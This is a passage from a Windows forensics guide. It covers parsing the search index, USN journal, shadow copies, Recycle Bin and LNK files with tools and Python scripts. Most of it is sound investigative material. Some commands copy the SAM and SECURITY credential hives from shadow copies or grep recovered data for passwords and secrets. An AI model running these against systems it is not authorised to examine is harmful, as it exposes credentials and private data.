    # Column names: System_ItemPathDisplay, System_DateModified, etc.
    print(record.get_value_data_as_string(0))  # Adjust column index
EOF
```

### Parsing with Specialized Tools

**Using WinSearchDBAnalyzer:**

```bash
git clone https://github.com/moaistory/WinSearchDBAnalyzer.git
cd WinSearchDBAnalyzer

# Parse Windows.edb
python3 WinSearchDBAnalyzer.py -f Windows.edb -o output.csv
```

**Using Autopsy (GUI):**

```bash
# Autopsy automatically parses Windows.edb when analyzing disk images
# Indexed Files module extracts search index data
autopsy
```

### Forensically Relevant Data

**Information available:**

- Full file paths (including deleted files if indexed before deletion)
- File metadata (size, creation/modification times)
- Email metadata (sender, recipient, subject, body snippets) - if Outlook indexed
- Document content snippets (first 64KB typically indexed)
- URL history (if browser history indexed)
- Encryption status (EFS encrypted files noted)

**File path extraction:**

```bash
# Extract SystemIndex_0A table
esedbexport -t SystemIndex_0A Windows.edb -o ./output/

# Parse for file paths
cat output/SystemIndex_0A.export/*.txt | grep "System_ItemPathDisplay" -A 1

# Common pattern: file paths stored in UTF-16
```

**Deleted file evidence:**

```bash
# [Inference] Search index may retain entries for deleted files
# Index updates lag behind filesystem changes
# Cross-reference with MFT to identify deleted files still in index
```

**Email forensics:**

```bash
# Outlook PST files indexed by Windows Search
# Extract email metadata:
# - System_Message_FromAddress
# - System_Message_ToAddress
# - System_Subject
# - System_Message_DateReceived
# - System_Search_Contents (body snippet)

grep "System_Message" output/SystemIndex_0A.export/*.txt
```

### Search Query History

**Location:**

```
Registry: NTUSER.DAT\Software\Microsoft\Windows Search\Preferences\Queries

# Stores recent search queries
# [Unverified] May vary by Windows version
```

**WordWheelQuery (File Explorer searches):**

```
Registry: NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery

# MRUList: Order of searches (most recent = 0)
# Numbered values (0, 1, 2...): Search terms in unicode
```

**Extracting search queries:**

```bash
# Using RegRipper
./rip.pl -r NTUSER.DAT -p wordwheel

# Output: List of search terms with timestamps
```

### Forensic Analysis

**Sensitive file discovery:**

```bash
# Search for keywords in indexed content
grep -i "password\|confidential\|secret" output/SystemIndex_0A.export/*.txt

# Files user searched for
grep -i "System_Search_Contents" output/*.txt
```

**Timeline reconstruction:**

```bash
# Index modification times indicate when files existed
# Combine with file paths to build user activity timeline

awk -F'|' '{print $timestamp_column, $path_column}' parsed_output.csv | sort
```

**External drive indexing:**

```bash
# Indexed removable drives reveal connected USB devices
# Look for paths like E:\, F:\, etc.

grep ":\\\\" output/*.txt | grep -v "^C:" | grep -v "^D:"
```

## USN Journal Analysis

The Update Sequence Number (USN) Journal is a feature of NTFS that logs filesystem changes, providing a detailed audit trail.

### USN Journal Overview

**Location:**

```
NTFS: $Extend\$UsnJrnl

# Two data streams:
# $J - Journal data (change records)
# $Max - Metadata (max size, allocation delta)
```

**Records:**

- File/folder creation
- Deletion
- Rename/move
- Attribute modification
- Data overwrite
- Timestamps (not modification time, but journal entry time)

**[Inference] USN Journal entries persist until journal wraps (FIFO), typically storing days to weeks of activity depending on journal size and filesystem activity.**

### Extracting USN Journal

**From mounted NTFS volume:**

```bash
# Using fsutil (Windows, requires admin)
fsutil usn readjournal C: csv > usn_journal.csv

# Using istat (Sleuth Kit)
istat -o <offset_in_sectors> image.raw 0-128-1 > usn_journal_data

# $UsnJrnl MFT entry is typically 0 (root) + extended metadata
```

**From disk image:**

```bash
# Extract $UsnJrnl using icat
icat -o <offset> image.raw 0-128-1 > usn_journal.bin

# Or using tsk_recover
tsk_recover -e -o <offset> image.raw ./output/
# Look for $Extend/$UsnJrnl:$J
```

**Using FTK Imager (Windows):**

```
1. Load disk image
2. Navigate to [root]\$Extend\$UsnJrnl
3. Export $J stream
```

### Parsing USN Journal

**Using MFTECmd (Eric Zimmerman):**

```bash
wget https://f001.backblazeb2.com/file/EricZimmermanTools/MFTECmd.zip
unzip MFTECmd.zip

# Parse USN journal
./MFTECmd -f '$J' --csv ./output --csvf usn.csv

# Outputs:
# - Entry number
# - Timestamp
# - Filename
# - File reference (MFT entry + sequence)
# - Parent file reference
# - Reason (why change logged)
# - Update flags
```

**Using usn.py (analyzeMFT):**

```bash
git clone https://github.com/dkovar/analyzeMFT.git
cd analyzeMFT

python3 usn.py -f '$J' -o usn_output.csv
```

**Manual parsing structure:**

```python
import struct

with open('$J', 'rb') as f:
    while True:
        record_length_data = f.read(4)
        if len(record_length_data) < 4:
            break
            
        record_length = struct.unpack('<I', record_length_data)[0]
        if record_length == 0:
            f.read(4)  # Skip padding
            continue
            
        # Read rest of record
        record_data = f.read(record_length - 4)
        
        # Parse fields (offsets for Windows 7+)
        major_version = struct.unpack('<H', record_data[0:2])[0]
        minor_version = struct.unpack('<H', record_data[2:4])[0]
        mft_reference = struct.unpack('<Q', record_data[4:12])[0]
        parent_reference = struct.unpack('<Q', record_data[12:20])[0]
        usn = struct.unpack('<Q', record_data[20:28])[0]
        timestamp = struct.unpack('<Q', record_data[28:36])[0]  # FILETIME
        reason = struct.unpack('<I', record_data[36:40])[0]
        source_info = struct.unpack('<I', record_data[40:44])[0]
        security_id = struct.unpack('<I', record_data[44:48])[0]
        file_attributes = struct.unpack('<I', record_data[48:52])[0]
        filename_length = struct.unpack('<H', record_data[52:54])[0]
        filename_offset = struct.unpack('<H', record_data[54:56])[0]
        
        # Extract filename (UTF-16)
        filename = record_data[56:56+filename_length].decode('utf-16-le', errors='ignore')
        
        print(f"File: {filename}, Reason: {hex(reason)}, Time: {timestamp}")
```

### USN Reason Flags

**Common reason codes:**

```
0x00000001 - USN_REASON_DATA_OVERWRITE - Data overwritten
0x00000002 - USN_REASON_DATA_EXTEND - Data extended
0x00000004 - USN_REASON_DATA_TRUNCATION - Data truncated
0x00000010 - USN_REASON_NAMED_DATA_OVERWRITE - Named stream overwritten
0x00000020 - USN_REASON_NAMED_DATA_EXTEND - Named stream extended
0x00000040 - USN_REASON_NAMED_DATA_TRUNCATION - Named stream truncated
0x00000100 - USN_REASON_FILE_CREATE - File/folder created
0x00000200 - USN_REASON_FILE_DELETE - File/folder deleted
0x00000400 - USN_REASON_EA_CHANGE - Extended attribute changed
0x00000800 - USN_REASON_SECURITY_CHANGE - Security descriptor changed
0x00001000 - USN_REASON_RENAME_OLD_NAME - Renamed (old name)
0x00002000 - USN_REASON_RENAME_NEW_NAME - Renamed (new name)
0x00004000 - USN_REASON_INDEXABLE_CHANGE - Indexable attribute changed
0x00008000 - USN_REASON_BASIC_INFO_CHANGE - Basic info changed (timestamps, attributes)
0x00010000 - USN_REASON_HARD_LINK_CHANGE - Hard link changed
0x00020000 - USN_REASON_COMPRESSION_CHANGE - Compression changed
0x00040000 - USN_REASON_ENCRYPTION_CHANGE - Encryption changed
0x00080000 - USN_REASON_OBJECT_ID_CHANGE - Object ID changed
0x00100000 - USN_REASON_REPARSE_POINT_CHANGE - Reparse point changed
0x00200000 - USN_REASON_STREAM_CHANGE - Named stream changed
0x80000000 - USN_REASON_CLOSE - File handle closed
```

### Forensic Analysis

**File creation timeline:**

```bash
# Filter for file creation events
grep "0x00000100" usn.csv | awk -F',' '{print $timestamp, $filename}' | sort

# Identify bulk file creation (malware unpacking, data staging)
grep "0x00000100" usn.csv | awk -F',' '{print $timestamp}' | uniq -c | sort -rn
```

**File deletion evidence:**

```bash
# Find deleted files
grep "0x00000200" usn.csv

# Cross-reference with MFT to identify recoverable deleted files
# USN provides filename even if MFT entry reused
```

**Rename tracking:**

```bash
# Track file renames (anti-forensics technique)
grep "0x00001000\|0x00002000" usn.csv | sort -t',' -k1

# Look for paired entries (old name + new name with same MFT reference)
```

**Timestomping detection:**

```bash
# BASIC_INFO_CHANGE (0x00008000) indicates timestamp modification
# Suspicious if timestamp set to past date

grep "0x00008000" usn.csv | awk -F',' '{print $timestamp, $filename, $reason}'
```

**Data exfiltration patterns:**

```bash
# Identify files written then immediately deleted
# Pattern: CREATE -> EXTEND -> DELETE in short timeframe

awk -F',' '{files[$mft_ref] = files[$mft_ref] "," $reason; times[$mft_ref] = times[$mft_ref] "," $timestamp}
END {
    for (ref in files) {
        if (files[ref] ~ /0x00000100.*0x00000002.*0x00000200/)
            print ref, files[ref], times[ref]
    }
}' usn.csv
```

**Encryption activity:**

```bash
# Ransomware detection: mass encryption events
grep "0x00040000" usn.csv | awk -F',' '{print $timestamp}' | uniq -c | sort -rn

# Sudden spike in encryption changes indicates potential ransomware
```

**External media usage:**

```bash
# USN journal specific to each NTFS volume
# Extract journals from all volumes to track external drive activity
# Correlate with registry USB history
```

### Combining USN with MFT

**Correlating entries:**

```bash
# USN provides timeline, MFT provides current state
# Match MFT entry numbers between datasets

# Files in USN but not in MFT = deleted files
comm -23 <(awk -F',' '{print $mft_entry}' usn.csv | sort -u) \
         <(awk -F',' '{print $entry}' mft.csv | sort -u)
```

## Volume Shadow Copies

Volume Shadow Copies (VSS) create point-in-time snapshots of NTFS volumes, preserving previous file versions and deleted files.

### VSS Overview

**Storage location:**

```
System Volume Information\
└── {GUID}  - Shadow copy storage

# Located in root of each NTFS volume
# Requires System Volume Information access (SYSTEM permissions)
```

**Shadow copy types:**

- System Restore points
- Windows Backup snapshots
- Manual VSS snapshots
- Application-triggered snapshots (SQL Server, Exchange)

### Identifying Shadow Copies

**Using vshadowinfo:**

```bash
apt-get install libvshadow-utils

# From mounted partition
vshadowinfo /dev/loop0p1

# From disk image with offset
vshadowinfo -o <byte_offset> disk.raw

# Output:
# - Number of stores
# - Store identifiers (GUIDs)
# - Creation times
# - Volume size
```

**Using vssadmin (Windows):**

```bash
# List all shadow copies
vssadmin list shadows

# Output includes:
# - Shadow Copy ID (GUID)
# - Original Volume
# - Creation Time
# - Provider (software/system)
```

### Mounting Shadow Copies

**Linux - using vshadowmount:**

```bash
# Mount VSS stores
mkdir /mnt/vss
vshadowmount -o <offset> disk.raw /mnt/vss

# List available snapshots
ls -la /mnt/vss/
# Output: vss1, vss2, vss3...

# Mount specific snapshot (read-only)
mkdir /mnt/snapshot1
mount -o ro,loop,show_sys_files,streams_interface=windows /mnt/vss/vss1 /mnt/snapshot1

# Alternative: specify offset for partition within snapshot
mount -o ro,loop,offset=$((2048*512)),show_sys_files /mnt/vss/vss1 /mnt/snapshot1

# Browse filesystem at point-in-time
ls -laR /mnt/snapshot1/

# Cleanup
umount /mnt/snapshot1
fusermount -u /mnt/vss
```

**Windows - using VSS symbolic links:**

```bash
# Create symbolic link to shadow copy
mklink /d C:\VSS \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\

# Browse snapshot
dir C:\VSS

# Remove link
rmdir C:\VSS
```

**Using ShadowExplorer (Windows GUI):**

```
1. Download ShadowExplorer
2. Launch application
3. Select date/time from dropdown
4. Browse filesystem at snapshot point
5. Export files as needed
```

### Extracting Files from Shadow Copies

**Individual file recovery:**

```bash
# Mount snapshot
vshadowmount -o <offset> disk.raw /mnt/vss
mount -o ro,loop /mnt/vss/vss1 /mnt/snapshot1

# Copy specific file
cp /mnt/snapshot1/Users/user/Documents/deleted_file.docx ./recovered/

# Preserve timestamps
cp -p /mnt/snapshot1/path/to/file ./recovered/
```

**Bulk recovery:**

```bash
# Recover entire directory structure
rsync -av /mnt/snapshot1/Users/user/Documents/ ./recovered_docs/

# Recover with timestamps preserved
tar -C /mnt/snapshot1 -cf - . | tar -C ./recovered/ -xf -
```

**Differential analysis:**

```bash
# Compare current filesystem with snapshot
diff -r /mnt/current/Users/user/ /mnt/snapshot1/Users/user/ > differences.txt

# Find files deleted since snapshot
comm -23 <(find /mnt/snapshot1/ -type f | sort) \
         <(find /mnt/current/ -type f | sort) > deleted_files.txt

# Find files added since snapshot
comm -13 <(find /mnt/snapshot1/ -type f | sort) \
         <(find /mnt/current/ -type f | sort) > added_files.txt
```

### Registry Recovery from VSS

**Extract registry hives from snapshots:**

```bash
# Mount snapshot
vshadowmount -o <offset> disk.raw /mnt/vss
mount -o ro,loop /mnt/vss/vss2 /mnt/snapshot2

# Copy registry hives
cp /mnt/snapshot2/Windows/System32/config/{SAM,SECURITY,SOFTWARE,SYSTEM} ./vss_registry/
cp /mnt/snapshot2/Users/*/NTUSER.DAT ./vss_registry/

# Analyze with RegRipper
./rip.pl -r ./vss_registry/SYSTEM -p compname
```

**Comparing registry versions:**

```bash
# Parse both current and snapshot registry
./rip.pl -r current_SOFTWARE -p soft > current_software.txt
./rip.pl -r vss_SOFTWARE -p soft > vss_software.txt

# Identify differences
diff current_software.txt vss_software.txt > registry_changes.txt
```

### Event Log Recovery

**Extract event logs from snapshots:**

```bash
# Mount snapshot
mount -o ro,loop /mnt/vss/vss3 /mnt/snapshot3

# Copy event logs
cp /mnt/snapshot3/Windows/System32/winevt/Logs/*.evtx ./vss_logs/

# Parse with EvtxECmd
./EvtxECmd -f ./vss_logs/Security.evtx --csv ./output --csvf vss_security.csv

# Compare with current logs to find cleared events
```

### Browser History Recovery

**Firefox profile recovery:**

```bash
# Mount snapshot
mount -o ro,loop /mnt/vss/vss1 /mnt/snapshot1

# Copy Firefox places.sqlite
cp /mnt/snapshot1/Users/user/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release/places.sqlite ./

# Analyze with browser history tools
sqlite3 places.sqlite "SELECT url, visit_date FROM moz_places JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id;"
```

**Chrome history recovery:**

```bash
# Copy Chrome History database
cp /mnt/snapshot1/Users/user/AppData/Local/Google/Chrome/User\ Data/Default/History ./

# Query history
sqlite3 History "SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch') FROM urls ORDER BY last_visit_time DESC;"
```

### Forensic Applications

**Deleted file recovery:**

```bash
# [Inference] Files deleted after snapshot creation remain in older snapshots
# Iterate through all snapshots to find earliest copy

for snapshot in /mnt/vss/vss*; do
    echo "Checking $snapshot"
    if [ -f "$snapshot/Users/user/Documents/important.docx" ]; then
        echo "Found in $snapshot"
        stat "$snapshot/Users/user/Documents/important.docx"
    fi
done
```

**Timeline reconstruction:**

```bash
# Extract creation times of all snapshots
vshadowinfo disk.raw | grep "Creation time"

# Map snapshots to events (malware infection, data theft, etc.)
# Snapshot before incident = clean baseline
# Snapshot after incident = compromised state
```

**Anti-forensics detection:**

```bash
# Check for VSS deletion (common anti-forensic technique)
# Recent snapshots missing = potential evidence destruction

# Check System event log for VSS service activity (Event ID 8224)
grep "8224" System.csv
```

**Malware analysis:**

```bash
# Compare clean snapshot vs infected state
# Identify files created/modified by malware

diff -qr /mnt/snapshot_before/ /mnt/snapshot_after/ | grep "Only in /mnt/snapshot_after"
```

## Recycle Bin Forensics

The Recycle Bin preserves deleted files with metadata, providing evidence of user deletion actions and file recovery opportunities.

### Recycle Bin Structure

**Windows Vista/7/8/10/11:**

```
C:\$Recycle.Bin\<SID>\
├── $I<random>.<ext>  - Metadata file (original path, deletion time, size)
└── $R<random>.<ext>  - Recovered file data (actual deleted file)

# One $I file per deleted file
# Corresponding $R file has same random string
```

**Windows XP/2000:**

```
C:\RECYCLER\<SID>\
├── INFO2            - Central index file (all deleted files metadata)
└── D<letter><number>.<ext> - Deleted file data

# Single INFO2 contains all entries
# Dc1.txt, Dd2.docx, etc.
```

**External drives:**

```
<Drive>:\$RECYCLE.BIN\<SID>\
└── Same structure as system drive

# Each NTFS volume has independent Recycle Bin
```

### $I File Format (Windows Vista+)

**Structure (64 bytes header + path):**

```
Offset 0x00 (8 bytes):  Version (01 00 00 00 00 00 00 00 for Win Vista/7, 02 00 00 00 00 00 00 00 for Win 10)
Offset 0x08 (8 bytes):  Original file size (little-endian)
Offset 0x10 (8 bytes):  Deletion timestamp (FILETIME format)
Offset 0x18 (variable): Original file path (UTF-16, null-terminated)
```

**Parsing $I files:**

```python
import struct
from datetime import datetime, timedelta

def parse_i_file(filepath):
    with open(filepath, 'rb') as f:
        data = f.read()
    
    version = struct.unpack('<Q', data[0:8])[0]
    file_size = struct.unpack('<Q', data[8:16])[0]
    timestamp_raw = struct.unpack('<Q', data[16:24])[0]
    
    # Convert FILETIME to datetime
    # FILETIME = 100-nanosecond intervals since 1601-01-01
    timestamp = datetime(1601, 1, 1) + timedelta(microseconds=timestamp_raw/10)
    
    # Extract path (UTF-16)
    path_data = data[24:]
    original_path = path_data.decode('utf-16-le').rstrip('\x00')
    
    return {
        'version': version,
        'size': file_size,
        'deleted': timestamp,
        'original_path': original_path
    }

# Example usage (continued)
info = parse_i_file('$I9A2B3C.docx')
print(f"File: {info['original_path']}")
print(f"Size: {info['size']} bytes")
print(f"Deleted: {info['deleted']}")
```

**Using RBCmd (Eric Zimmerman):**

```bash
wget https://f001.backblazeb2.com/file/EricZimmermanTools/RBCmd.zip
unzip RBCmd.zip

# Parse single $I file
./RBCmd -f '$I9A2B3C.docx'

# Parse entire Recycle Bin directory
./RBCmd -d '/mnt/win/$Recycle.Bin/S-1-5-21-1234567890-1234567890-1234567890-1001/' --csv ./output --csvf recyclebin.csv

# Parse all users' Recycle Bins
./RBCmd -d '/mnt/win/$Recycle.Bin/' --csv ./output --csvf all_recyclebin.csv
```

**Output fields:**

- $I filename
- Corresponding $R filename
- Original file path
- File size
- Deletion timestamp
- User SID

### INFO2 Format (Windows XP)

**Structure:**

```
Header (20 bytes):
- Offset 0x00 (4 bytes): Version (0x00000005)
- Offset 0x04 (4 bytes): Unknown
- Offset 0x08 (4 bytes): Unknown
- Offset 0x0C (4 bytes): Record size (0x320 = 800 bytes)
- Offset 0x10 (4 bytes): Total size of all records

Records (800 bytes each):
- Offset 0x00 (260 bytes): Original file path (ASCII, null-terminated)
- Offset 0x104 (4 bytes): Record number/index
- Offset 0x108 (4 bytes): Drive number (0=A:, 2=C:, etc.)
- Offset 0x10C (8 bytes): Deletion timestamp (FILETIME)
- Offset 0x114 (4 bytes): Physical file size
```

**Parsing INFO2:**

```python
import struct
from datetime import datetime, timedelta

def parse_info2(filepath):
    with open(filepath, 'rb') as f:
        # Read header
        header = f.read(20)
        version = struct.unpack('<I', header[0:4])[0]
        record_size = struct.unpack('<I', header[12:16])[0]
        
        entries = []
        while True:
            record = f.read(record_size)
            if len(record) < record_size:
                break
            
            # Parse record
            original_path = record[0:260].decode('ascii', errors='ignore').rstrip('\x00')
            if not original_path:
                continue
                
            record_num = struct.unpack('<I', record[260:264])[0]
            drive_num = struct.unpack('<I', record[264:268])[0]
            timestamp_raw = struct.unpack('<Q', record[268:276])[0]
            file_size = struct.unpack('<I', record[276:280])[0]
            
            # Convert timestamp
            timestamp = datetime(1601, 1, 1) + timedelta(microseconds=timestamp_raw/10)
            
            # Map drive number to letter
            drive_letter = chr(65 + drive_num) + ':'
            
            entries.append({
                'path': original_path,
                'record': record_num,
                'drive': drive_letter,
                'deleted': timestamp,
                'size': file_size,
                'filename': f'D{chr(97 + drive_num)}{record_num}'
            })
        
        return entries

# Example usage
entries = parse_info2('INFO2')
for entry in entries:
    print(f"{entry['filename']}: {entry['path']} ({entry['size']} bytes, deleted {entry['deleted']})")
```

**Using Rifiuti2:**

```bash
# Install rifiuti2
apt-get install rifiuti2

# Parse INFO2 (Windows XP)
rifiuti -o recyclebin_xp.txt INFO2

# Parse Vista+ $Recycle.Bin
rifiuti-vista -o recyclebin_vista.txt /mnt/win/'$Recycle.Bin'/S-1-5-21-*/

# Output to XML
rifiuti-vista -x -o recyclebin.xml /path/to/recycle.bin/
```

### Recovering Deleted Files

**Manual recovery:**

```bash
# Identify $I/$R pairs
ls -la '/mnt/win/$Recycle.Bin/S-1-5-21-*/'

# Parse $I file to get original name
./RBCmd -f '$IABC123.docx'

# Copy $R file with original name
cp '$RABC123.docx' ./recovered/important_document.docx

# Preserve timestamps
cp -p '$RABC123.docx' ./recovered/important_document.docx
```

**Bulk recovery script:**

```bash
#!/bin/bash
RECYCLE_DIR="/mnt/win/\$Recycle.Bin/S-1-5-21-*/"
OUTPUT_DIR="./recovered"

mkdir -p "$OUTPUT_DIR"

# Find all $I files
find "$RECYCLE_DIR" -name '$I*' | while read i_file; do
    # Extract identifier
    identifier=$(basename "$i_file" | sed 's/\$I//')
    
    # Find corresponding $R file
    r_file=$(dirname "$i_file")/\$R$identifier
    
    if [ -f "$r_file" ]; then
        # Parse $I file for original path
        original_path=$(./RBCmd -f "$i_file" --csv . --csvf temp.csv | tail -1 | cut -d',' -f3)
        
        # Extract filename from path
        filename=$(basename "$original_path")
        
        # Copy and rename
        cp -p "$r_file" "$OUTPUT_DIR/$filename"
        echo "Recovered: $filename"
    fi
done
```

### Forensic Analysis

**User activity timeline:**

```bash
# Parse all Recycle Bins
./RBCmd -d '/mnt/win/$Recycle.Bin/' --csv ./output --csvf recycle.csv

# Sort by deletion time
sort -t',' -k5 recycle.csv

# Identify mass deletion events (data destruction)
awk -F',' '{print substr($5,1,16)}' recycle.csv | uniq -c | sort -rn
```

**Identifying user by SID:**

```bash
# Extract SID from Recycle Bin path
ls -la '/mnt/win/$Recycle.Bin/'

# Match SID to username in registry
./rip.pl -r SAM -p samparse | grep "S-1-5-21-1234567890-1234567890-1234567890-1001"

# Or query NTUSER.DAT location
# SID matches directory name: C:\Users\<username>\NTUSER.DAT
```

**Sensitive file deletion:**

```bash
# Search for keywords in recovered filenames
grep -i "password\|confidential\|secret" recycle.csv

# Check file types
awk -F',' '{print $3}' recycle.csv | grep -o '\.[^.]*$' | sort | uniq -c | sort -rn

# Common suspicious patterns:
# - Database files (.db, .sqlite, .mdb)
# - Archive files (.zip, .rar, .7z)
# - Credential stores (.kdbx, .1pif)
```

**Anti-forensics detection:**

```bash
# Check for Recycle Bin bypass (Shift+Delete leaves no trace)
# Compare file deletion indicators:
# - MFT deleted entries
# - USN journal deletion records
# - Files NOT in Recycle Bin

# Entries in MFT/USN but not Recycle Bin = permanent deletion
comm -23 <(grep "0x00000200" usn.csv | awk -F',' '{print $filename}' | sort) \
         <(awk -F',' '{print $3}' recycle.csv | sort) > permanently_deleted.txt
```

**External drive usage:**

```bash
# Each removable drive has independent Recycle Bin
# Check for external drive Recycle Bins in image

find /mnt/win/ -name '$Recycle.Bin' -o -name 'RECYCLER'

# Reveals files deleted from USB drives, network shares
```

**File size anomalies:**

```bash
# Compare $I size metadata vs actual $R file size
ls -l '$R*' | awk '{print $5, $9}' > actual_sizes.txt
./RBCmd -d . --csv . --csvf metadata.csv
awk -F',' '{print $4, $2}' metadata.csv > metadata_sizes.txt

# Mismatch indicates file modification in Recycle Bin (unusual) or corruption
```

### Recycle Bin Wiping

**Detecting intentional clearing:**

```bash
# [Inference] Mass deletion of Recycle Bin suggests evidence destruction
# Check for:
# 1. Empty Recycle Bin despite recent file activity
# 2. Registry key tracking last empty time

# Windows tracks Recycle Bin statistics in registry
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\BitBucket

# EmptyDate value indicates last manual empty
./rip.pl -r NTUSER.DAT -p bitbucket
```

**Carved Recycle Bin artifacts:**

```bash
# Use file carving on unallocated space
foremost -t all -i disk.raw -o carved/
scalpel disk.raw -o carved/

# Search for $I file headers
xxd disk.raw | grep "01 00 00 00 00 00 00 00" -B 1 -A 10

# Recover partial $I files from slack space
```

## LNK File Analysis

Windows Shortcut (LNK) files contain metadata about target files, providing forensic evidence of file access, removable media usage, and network shares.

### LNK File Overview

**Location:**

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Recent\
├── *.lnk          - Recent documents shortcuts
└── AutomaticDestinations\
    CustomDestinations\

C:\Users\<username>\Desktop\
└── *.lnk          - Desktop shortcuts

C:\Users\<username>\AppData\Roaming\Microsoft\Office\Recent\
└── *.lnk          - Office recent files

# LNK files also embedded in Jump Lists
```

**Information stored:**

- Target file path (local and network)
- Target file size
- Target MAC times (Modified, Accessed, Created)
- Drive type (fixed, removable, network)
- Drive serial number
- Volume label
- Machine ID (NetBIOS name)
- User's MAC address
- Target MFT entry number/sequence
- Distributed Link Tracking data

### LNK File Structure

**Header (76 bytes):**

```
Offset 0x00 (4 bytes):  Header size (0x0000004C)
Offset 0x04 (16 bytes): Link CLSID (00021401-0000-0000-C000-000000000046)
Offset 0x14 (4 bytes):  Link flags (determines which structures present)
Offset 0x18 (4 bytes):  Target file attributes
Offset 0x1C (8 bytes):  Target creation time (FILETIME)
Offset 0x24 (8 bytes):  Target access time (FILETIME)
Offset 0x2C (8 bytes):  Target write time (FILETIME)
Offset 0x34 (4 bytes):  Target file size
Offset 0x38 (4 bytes):  Icon index
Offset 0x3C (4 bytes):  Show command (window state)
Offset 0x40 (2 bytes):  Hot key
```

**Link flags (offset 0x14):**

```
0x00000001 - HasLinkTargetIDList
0x00000002 - HasLinkInfo
0x00000004 - HasName (description)
0x00000008 - HasRelativePath
0x00000010 - HasWorkingDir
0x00000020 - HasArguments
0x00000040 - HasIconLocation
0x00000080 - IsUnicode
0x00000100 - ForceNoLinkInfo
0x00000200 - HasExpString
0x00000400 - RunInSeparateProcess
0x00000800 - HasDarwinID
0x00001000 - RunAsUser
0x00002000 - HasExpIcon
0x00004000 - NoPidlAlias
0x00008000 - RunWithShimLayer
0x00010000 - ForceNoLinkTrack
0x00020000 - EnableTargetMetadata
0x00040000 - DisableLinkPathTracking
0x00080000 - DisableKnownFolderTracking
0x00100000 - NoKFIDAlias
0x00200000 - AllowLinkToLink
0x00400000 - UnaliasOnSave
0x00800000 - PreferEnvironmentPath
0x01000000 - KeepLocalIDListForUNCTarget
```

**LinkInfo structure (variable size, if HasLinkInfo flag set):**

```
Contains:
- Local path (if local file)
- Network share path (if UNC path)
- Drive type
- Drive serial number
- Volume label
```

**ExtraData blocks (variable, at end of file):**

```
Common blocks:
- TrackerDataBlock (0xA0000003): Distributed Link Tracking
  - Machine ID (NetBIOS name)
  - MAC address
  - Droid volume/file IDs
- VistaAndAboveIDListDataBlock (0xA000000C): Shell items
- PropertyStoreDataBlock (0xA0000009): Additional properties
```

### Parsing LNK Files

**Using LECmd (Eric Zimmerman):**

```bash
wget https://f001.backblazeb2.com/file/EricZimmermanTools/LECmd.zip
unzip LECmd.zip

# Parse single LNK file
./LECmd -f document.lnk

# Parse directory of LNK files
./LECmd -d /mnt/win/Users/user/AppData/Roaming/Microsoft/Windows/Recent/ --csv ./output --csvf lnk_recent.csv

# Parse all users' LNK files
./LECmd -d /mnt/win/Users/ --csv ./output --csvf all_lnk.csv

# Output includes:
# - Source file (LNK location)
# - Target file path (local and UNC)
# - Target MAC times
# - LNK creation/modification times
# - Volume information
# - Machine ID
# - MAC address
```

**Using lnk-parse:**

```bash
git clone https://github.com/lcorbasson/lnk-parse.git
cd lnk-parse

python3 lnk-parse.py document.lnk

# Outputs detailed structure including:
# - Header information
# - Link flags
# - Target attributes
# - Timestamps
# - Path information
# - Extra data blocks
```

**Manual parsing in Python:**

```python
import struct
from datetime import datetime, timedelta

def parse_lnk_header(filepath):
    with open(filepath, 'rb') as f:
        data = f.read(76)
    
    header_size = struct.unpack('<I', data[0:4])[0]
    if header_size != 0x0000004C:
        raise ValueError("Invalid LNK file")
    
    link_flags = struct.unpack('<I', data[0x14:0x18])[0]
    file_attributes = struct.unpack('<I', data[0x18:0x1C])[0]
    
    # Parse timestamps (FILETIME format)
    creation_raw = struct.unpack('<Q', data[0x1C:0x24])[0]
    access_raw = struct.unpack('<Q', data[0x24:0x2C])[0]
    write_raw = struct.unpack('<Q', data[0x2C:0x34])[0]
    
    def filetime_to_datetime(ft):
        if ft == 0:
            return None
        return datetime(1601, 1, 1) + timedelta(microseconds=ft/10)
    
    creation_time = filetime_to_datetime(creation_raw)
    access_time = filetime_to_datetime(access_raw)
    write_time = filetime_to_datetime(write_raw)
    
    file_size = struct.unpack('<I', data[0x34:0x38])[0]
    
    return {
        'link_flags': link_flags,
        'attributes': file_attributes,
        'created': creation_time,
        'accessed': access_time,
        'modified': write_time,
        'size': file_size
    }

# Example usage
info = parse_lnk_header('document.lnk')
print(f"Target created: {info['created']}")
print(f"Target modified: {info['modified']}")
print(f"Target size: {info['size']} bytes")
```

### Extracting Metadata

**Volume serial number:**

```bash
# Extract from LinkInfo structure
./LECmd -f document.lnk | grep "Volume Serial"

# Correlate with registry MountedDevices
./rip.pl -r SYSTEM -p mountdev
```

**Machine ID (NetBIOS name):**

```bash
# Extract from TrackerDataBlock
./LECmd -f document.lnk | grep "Machine ID"

# Identifies source computer name
# Useful for tracking file origins in network environments
```

**MAC address:**

```bash
# Extract from TrackerDataBlock
./LECmd -f document.lnk | grep "MAC Address"

# [Inference] MAC address can identify specific network interface
# Cross-reference with DHCP logs or network device inventory
```

**UNC paths:**

```bash
# Extract network paths
./LECmd -d ./lnk_files/ --csv . --csvf lnk.csv
grep '\\\\' lnk.csv | awk -F',' '{print $target_path_column}'

# Reveals file servers, shared folders accessed by user
```

### Forensic Applications

**External media tracking:**

```bash
# Parse all LNK files
./LECmd -d /mnt/win/Users/ --csv ./output --csvf all_lnk.csv

# Filter for removable drives (E:, F:, G:, etc.)
grep "Drive type: Removable" output/lnk.csv

# Extract volume labels and serial numbers
awk -F',' '{print $volume_label, $volume_serial}' output/lnk.csv | sort -u

# Cross-reference with registry USB history
# SYSTEM\MountedDevices, SYSTEM\ControlSet001\Enum\USBSTOR
```

**File access timeline:**

```bash
# Extract LNK creation times (file first accessed)
awk -F',' '{print $lnk_creation, $target_path}' all_lnk.csv | sort

# Compare with target file MAC times
# Discrepancies indicate:
# - File moved/copied
# - Timestomping
# - File accessed from different location
```

**Network share access:**

```bash
# Extract UNC paths from LNK files
grep '\\\\' all_lnk.csv | awk -F',' '{print $target_path}' | sed 's/\\/\//g' | cut -d'/' -f1-4 | sort -u

# Reveals:
# - File servers accessed
# - Shared folders
# - Potential lateral movement paths
```

**Deleted file evidence:**

```bash
# LNK files persist after target deletion
# Indicates file previously existed

# Find LNK files with missing targets
